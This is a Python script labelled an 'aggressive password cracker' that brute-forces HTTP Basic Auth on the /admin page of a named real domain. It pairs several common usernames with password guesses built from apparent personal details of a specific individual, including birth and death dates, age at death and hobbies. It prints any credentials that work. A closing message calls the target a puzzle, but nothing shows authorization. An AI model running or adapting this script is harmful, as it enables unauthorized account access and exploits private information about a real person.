#!/usr/bin/env python3
"""
AGGRESSIVE PASSWORD CRACKER
Test the most likely passwords directly
"""

import requests
from requests.auth import HTTPBasicAuth

BASE_URL = "https://haian.de"

def aggressive_password_test():
    """Test the most likely password candidates"""
    print("="*70)
    print("AGGRESSIVE PASSWORD TESTING")
    print("="*70)
    
    # The most likely candidates based on our analysis
    passwords = [
        # Number 5 variants
        '5',
        '55',
        '555',
        
        # Age-related
        '25',  # Almost 25
        '24',  # Age at death
        '24.11.20',  # Age format
        
        # Skat numbers
        '120',
        '12024',
        '24120',
        
        # Thomas numbers
        '55',
        '60',
        '5560',
        '6055',
        
        # Combinations
        '524',  # 5, 24
        '5120',  # 5, 120
        '55560',  # 5, 55, 60
        
        # Pixel string fragments
        'kO~4O',
        'SZ25',
        '52dqk',
        
        # The full pixel string
        "kO~4OI|jM^{[kD_SZ25`R8TRrsQSj\\a5b<F4pru445bE_O?BED52dqks8=RSVOSB?utAWhilWh8euz>Odiz|9kOkrt@@;DpN=Nn`_edl}MAB|~PCno>",
        
        # Simple
        'password',
        'haian',
        'fabian',
        'admin',
        '12345',
        'qwerty',
        
        # Date combinations
        '30101986',  # Birth
        '20102011',  # Death
        '301086',  # Birth short
        '201011',  # Death short
        
        # Combined
        'haian5',
        'fabian5',
        'admin5',
        '5haian',
        '5admin',
        
        # Image related
        '700',
        '1000',
        '7001000',
        '269508',
        
        # HTML content
        'message',
        'condolence',
        'skat',
        'poker',
    ]
    
    usernames = ['admin', 'haian', 'fabian', 'user', 'root', '5', '']
    
    url = f"{BASE_URL}/admin"
    
    print(f"\nTesting {len(usernames)} usernames × {len(passwords)} passwords")
    print(f"Total combinations: {len(usernames) * len(passwords)}")
    print(f"Target: {url}\n")
    
    tested = 0
    for username in usernames:
        for password in passwords:
            tested += 1
            if tested % 50 == 0:
                print(f"  Tested {tested} combinations...")
            
            try:
                response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=5)
                if response.status_code == 200:
                    print(f"\n[*** SUCCESS ***] Username: '{username}', Password: '{password}'")
                    print(f"Response ({len(response.text)} chars):")
                    print(response.text[:1000])
                    return (username, password)
            except Exception as e:
                pass
    
    print(f"\n[*] Tested {tested} combinations - no success")
    return None

if __name__ == "__main__":
    result = aggressive_password_test()
    
    if result:
        print("\n" + "="*70)
        print("PASSWORD FOUND!")
        print("="*70)
        print(f"Username: {result[0]}")
        print(f"Password: {result[1]}")
    else:
        print("\n" + "="*70)
        print("PASSWORD NOT FOUND")
        print("="*70)
        print("\nPossible reasons:")
        print("  1. Password is not in our test set")
        print("  2. Requires different authentication method")
        print("  3. Puzzle has additional layers we haven't uncovered")
